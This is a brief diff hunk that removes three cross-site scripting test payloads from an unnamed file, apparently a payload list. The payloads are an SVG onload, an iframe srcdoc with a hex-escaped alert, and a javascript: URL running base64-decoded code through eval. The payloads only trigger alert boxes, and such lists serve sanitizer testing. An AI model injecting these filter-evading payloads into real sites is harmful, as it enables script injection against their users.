@@ -1,3 +1,0 @@
-<iframe srcdoc="<svg onload=setTimeout(`\x61\x6c\x65\x72\x74\x28\x31\x29`,0)>"></iframe>
-<iframe src=javascript:eval(atob('YWxlcnQoJzEnKQ=='))>
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
